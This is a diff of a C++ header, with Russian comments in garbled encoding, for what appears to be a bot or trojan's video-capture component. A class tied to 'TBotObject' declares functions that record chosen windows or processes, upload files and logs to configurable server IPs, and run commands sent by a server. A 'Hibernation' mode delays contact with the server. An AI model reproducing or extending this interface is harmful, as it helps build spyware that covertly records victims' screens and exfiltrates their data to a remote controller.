@@ -39,36 +39,44 @@ private:
 
 	// определ€ем типы функций
 	//функции инииализации и освобождени€ длл
-	typedef DWORD (WINAPI *TInit)( const char* uid, int flags, const char* ip1, int port1, const char* ip2, int port2 );
-	typedef void (WINAPI *TRelease)();
+	typedef DWORD (WINAPI *TInit)( const char* uid, int flags, const char* ip, int port, int downtime );
+	typedef void (WINAPI *TRelease)( DWORD server );
+	typedef DWORD (WINAPI *TAddIPServer)( DWORD server, const char* ip, int port );
 
 	//функции записи видео
-	typedef VOID (WINAPI *TStartRecHwnd	)( char* uid, char* nameVideo, HWND wnd, int seconds, int flags ) ;
-	typedef VOID (WINAPI *TStartRecPid  )( char* uid, char* nameVideo, DWORD pid, int seconds, int flags );
+	typedef VOID (WINAPI *TStartRecHwnd	)( DWORD server, char* uid, char* nameVideo, HWND wnd, int seconds, int flags ) ;
+	typedef VOID (WINAPI *TStartRecPid  )( DWORD server, char* uid, char* nameVideo, DWORD pid, int seconds, int flags );
 	typedef VOID (WINAPI *TStopRec		)();
 	typedef VOID (WINAPI *TResetTimer	)();
 
 	//функции отправки файлов
-	typedef VOID (WINAPI *TStartSend	)( char* path );
-	typedef DWORD (WINAPI *TStartSendAsync )( char* path );
+	typedef VOID (WINAPI *TStartSend	)( DWORD server, char* path );
+	typedef DWORD (WINAPI *TStartSendAsync )( DWORD server, char* path );
 	typedef DWORD (WINAPI *TIsSendedAsync )( DWORD );
 
 	//функции передачи логов на сервер
-	typedef void (WINAPI *TSendLog)( const char* name, int code, const char* text );
+	typedef void (WINAPI *TSendLog)( DWORD server, const char* name, int code, const char* text );
 
 	//запуск потока выполнени€ команд сервера
-	typedef DWORD (WINAPI *typeCallbackCmd)( DWORD cmd, char* inData, int lenInData, char* outData, int szOutData, DWORD* lenOutData );
-	typedef VOID (WINAPI *TRunCmdExec)(typeCallbackCmd);
+public:
+	typedef DWORD (WINAPI *typeCallbackCmd)( DWORD server, DWORD cmd, char* inData, int lenInData, char* outData, int szOutData, DWORD* lenOutData );
+private:
+	typedef VOID (WINAPI *TRunCmdExec)( DWORD server, typeCallbackCmd );
 
 	void InitializeApi();
 	void LoadFunc(const char* Name, LPVOID &Addr);
 
 public:
+
+	static const int Hibernation = 0x0001; //запуск в режиме сп€чки (сразу не коннектитс€ к серверу, а только при передачи данных)
+	static const int RunCallback = 0x1000; //запуск callback функции CallbackCmd из VideoRecorder.cpp
+
 	TVideoRecDLL();
 	~TVideoRecDLL();
 
 	TInit				Init;
 	TRelease			Release;
+	TAddIPServer		AddIPServer;
 	TStartRecHwnd		RecordWnd;
 	TStartRecPid		RecordProcess;
 	TStopRec			RecordStop;
@@ -93,12 +101,13 @@ char* GetNamePipe( char* buf );
 
 //функции через канал пайпа вызывают функции видео длл. ¬идео длл должна быть запущена
 //в единственном экземпл€ре в отдельном процессе
-bool RecordHWND( const char* name, HWND wnd, int seconds = 0, int flags = 0 );
-bool RecordPID( const char* name, DWORD pid = 0, int seconds = 0, int flags = 0 );
+int Init( int flags, const char* ip, int port, int downtime );
+bool RecordHWND( int server, const char* name, HWND wnd, int seconds = 0, int flags = 0 );
+bool RecordPID( int server, const char* name, DWORD pid = 0, int seconds = 0, int flags = 0 );
 void RecordStop();
-DWORD SendFiles( const char* name, const char* path, bool async = false );
+DWORD SendFiles( int server, const char* name, const char* path, bool async = false );
 bool FilesIsSended(DWORD id);
-bool SendLog( const char* name, int code, const char* text );
+bool SendLog( int server, const char* name, int code, const char* text );
 
 };
 
@@ -127,7 +136,7 @@ class VideoLog : public TBotObject
 		//тоже самое что и Send только без форматировани€ текста
 		static void Send2( const char* name, int code, const char* text )
 		{
-			VideoProcess::SendLog( name, code, text );
+			VideoProcess::SendLog( 0, name, code, text );
 		}
 
 };
@@ -143,5 +152,6 @@ PCHAR GetVideoRecHost2();
 bool SaveVideoDll( const char* nameFile );
 
 void StartVideoFromCurrentURL();
+
 
 #endif
